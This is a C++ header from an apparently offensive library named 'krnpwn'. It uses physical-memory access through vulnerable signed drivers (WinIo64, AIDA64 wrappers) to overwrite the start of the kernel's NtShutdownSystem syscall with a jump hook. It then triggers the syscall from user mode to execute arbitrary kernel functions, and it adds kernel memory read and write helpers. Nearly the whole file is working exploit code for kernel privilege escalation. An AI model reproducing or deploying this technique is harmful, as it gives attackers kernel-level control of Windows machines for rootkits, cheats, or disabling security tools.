#pragma once

#include "drivers/krnpwn_base.hpp"
#include "drivers/krnpwn_winio64.hpp"
#include "drivers/krnpwn_aida64.hpp"

#include "../util/hash.hpp"
#include "../util/native.hpp"
#include "../util/log.hpp"

#include <memory>
#include <vector>

namespace krnpwn
{
    // use a function that is rarely called as it can cause issues or bsod if
    // another process calls the syscall when our hook is in place
    // for this example we are using NtShutdownSystem
    constexpr const char* SYSCALL_FUNC = "NtShutdownSystem";
    constexpr const char* syscall_mod = "ntdll.dll";

    class krnpwn
    {
    private:
        std::shared_ptr< krnpwn_base > drv;
        std::vector<native::mem_region> regions;

        uint8_t* ntoskrnl_local = nullptr;
        uint32_t ksyscall_rva = 0;
        uint64_t ksyscall_address = 0;
        uint16_t page_offset = 0;

        bool initalised = false;

    public:
        krnpwn();
        ~krnpwn();

        bool initalise( std::shared_ptr< krnpwn_base > _driver );

        bool is_initalised() { return initalised; }

    private:
        uint64_t find_ksyscall( uint64_t address, uint64_t size );
        bool valid_ksyscall( uint64_t address );
        

    public:
        template< class T, class ... Args >
        std::invoke_result_t< T, Args... > kcall( void* address, Args ... args ) const
        {
            // get usermode syscall address
            static const auto proc = native::find_export( LoadLibraryA( syscall_mod ), SYSCALL_FUNC );

            // jmp [ rip + 0x0 ]
            // nop
            // nop
            // 
            // nops are used to ensure multiple of 4 as some drivers require this
            uint8_t jmp_code[] =
            {
                0xff, 0x25, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x90, 0x90
            };

            uint8_t orig_bytes[ sizeof( jmp_code ) ];

            // place function address into jump code
            *( void** )( jmp_code + 6 ) = address;

            // save original bytes
            drv->read_physical_memory( ksyscall_address, orig_bytes, sizeof( orig_bytes ) );

            // write jump hook to start of syscall function
            drv->write_physical_memory( ksyscall_address, jmp_code, sizeof( jmp_code ) );

            // call the usermode syscall to execute our hook and call kernel function
            auto result = reinterpret_cast< T >( proc )( args ... );


            // restore the syscall back to original
            drv->write_physical_memory( ksyscall_address, orig_bytes, sizeof( orig_bytes ) );

            return result;
        }

        template< class T, class ... Args >
        void void_kcall( void* address, Args ... args ) const
        {
            // get usermode syscall address
            static const auto proc = native::find_export( LoadLibraryA( syscall_mod ), SYSCALL_FUNC );

            // jmp [ rip + 0x0 ]
            // nop
            // nop
            // 
            // nops are used to ensure multiple of 4 as some drivers require this
            uint8_t jmp_code[] =
            {
                0xff, 0x25, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x90, 0x90
            };

            uint8_t orig_bytes[ sizeof( jmp_code ) ];

            // place function address into jump code
            *( void** )( jmp_code + 6 ) = address;

            // save original bytes
            drv->read_physical_memory( ksyscall_address, orig_bytes, sizeof( orig_bytes ) );

            // write jump hook to start of syscall function
            drv->write_physical_memory( ksyscall_address, jmp_code, sizeof( jmp_code ) );

            // call the usermode syscall to execute our hook and call kernel function
            reinterpret_cast< T >( proc )( args ... );

            // restore the syscall back to original
            drv->write_physical_memory( ksyscall_address, orig_bytes, sizeof( orig_bytes ) );
        }

        bool kmemcpy( void* dst, void* src, size_t size );

        template< class T >
        T read_km( void* address )
        {
            T buffer;
            kmemcpy( ( void* )&buffer, ( void* )address, sizeof( T ) );
            return buffer;
        }

        template< class T >
        void write_km( void* address, const T& value )
        {
            kmemcpy( ( void* )address, ( void* )&value, sizeof( T ) );
        }
    };
}